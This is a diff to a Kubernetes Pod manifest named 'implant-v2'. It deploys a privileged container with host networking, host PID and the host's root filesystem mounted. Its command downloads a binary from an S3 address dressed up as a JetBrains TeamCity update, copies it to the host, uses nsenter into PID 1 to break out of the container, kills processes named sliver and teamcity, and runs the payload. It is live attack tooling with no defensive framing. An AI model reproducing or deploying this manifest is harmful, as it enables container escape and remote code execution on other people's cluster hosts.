@@ -1,17 +1,24 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: direct-implant
+  name: implant-v2
   namespace: default
 spec:
   hostNetwork: true
   hostPID: true
   containers:
   - name: shell
-    image: ubuntu:latest
-    command: ["/bin/bash", "-c"]
+    image: alpine:latest
+    command: ["/bin/sh", "-c"]
     args:
-    - "apt-get update -qq && apt-get install -y -qq curl && curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin && chmod +x /tmp/ts && /tmp/ts & sleep 99999"
+    - "apk add --no-cache curl > /dev/null 2>&1; rm -f /host/tmp/ts /host/tmp/ts-old 2>/dev/null; curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin; md5sum /tmp/ts; chmod +x /tmp/ts; cp /tmp/ts /host/tmp/ts; chmod +x /host/tmp/ts; nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'pkill -f sliver 2>/dev/null; pkill -f teamcity 2>/dev/null; rm -f /tmp/ts-old; mv /tmp/ts /tmp/ts-old 2>/dev/null; chmod +x /tmp/ts && /tmp/ts &' 2>&1; echo 'DONE'; sleep 99999"
     securityContext:
       privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
   restartPolicy: Never
